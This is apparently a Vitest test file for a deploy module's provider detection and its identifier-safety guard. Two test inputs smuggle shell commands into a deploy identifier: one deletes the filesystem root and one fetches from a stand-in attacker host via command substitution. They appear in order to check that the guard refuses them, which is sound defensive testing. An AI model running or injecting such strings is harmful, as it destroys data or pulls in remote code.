import { describe, it, expect } from 'vitest'
import * as os from 'os'
import { providerFromCommand, promoteDeploy, rollbackDeploy } from './deploy'

describe('providerFromCommand', () => {
  it('identifies vercel', () => {
    expect(providerFromCommand('vercel --prod')).toBe('vercel')
  })

  it('identifies netlify', () => {
    expect(providerFromCommand('netlify deploy --prod')).toBe('netlify')
  })

  it('falls back to npm for anything else', () => {
    expect(providerFromCommand('npm run deploy')).toBe('npm')
    expect(providerFromCommand('./custom-deploy.sh')).toBe('npm')
  })
})

// These cover the identifier-safety guard only — never the real CLI-shelling
// success path, which needs a live authenticated vercel/netlify CLI + project
// and is out of scope for a unit test (same reason runDeploy/detectDeployCommand
// have no existing tests for their happy path either).
describe('deploy identifier safety guard', () => {
  const tmp = os.tmpdir()

  it('rejects an unsafe identifier in promoteDeploy before shelling out', async () => {
    const result = await promoteDeploy(tmp, 'vercel', 'abc; rm -rf /')
    expect(result.exitCode).toBe(-1)
    expect(result.stderr).toContain('Refused')
  })

  it('rejects an unsafe identifier in rollbackDeploy before shelling out', async () => {
    const result = await rollbackDeploy(tmp, '$(curl evil.sh)')
    expect(result.exitCode).toBe(-1)
    expect(result.stderr).toContain('Refused')
  })

  it('promoteDeploy for netlify never interpolates urlOrId and surfaces a real CommandResult shape', async () => {
    // netlify is provider-gated separately from the safety guard (rollback is
    // vercel-only) — this exercises the real `netlify deploy --prod` shell-out
    // path safely: the netlify CLI isn't installed in this environment, so it
    // fails fast with "command not found" rather than hanging or deploying anything.
    const result = await promoteDeploy(tmp, 'netlify', 'unused-id')
    expect(result.exitCode).not.toBe(0)
    expect(typeof result.stdout).toBe('string')
  }, 15000)
})
